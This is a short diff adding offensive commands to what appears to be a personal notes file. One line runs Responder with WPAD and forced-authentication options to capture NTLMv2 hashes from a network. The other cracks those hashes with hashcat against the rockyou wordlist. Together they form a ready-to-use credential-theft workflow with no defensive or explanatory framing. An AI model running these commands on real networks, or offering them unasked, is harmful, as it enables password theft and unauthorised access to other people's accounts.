@@ -1,0 +1,3 @@
+sudo responder -I eth0 -w -F == ntlmv2 hash grabber
+
+hashcat -m 5600 -a 0 hash wordlists/rockyou.txt
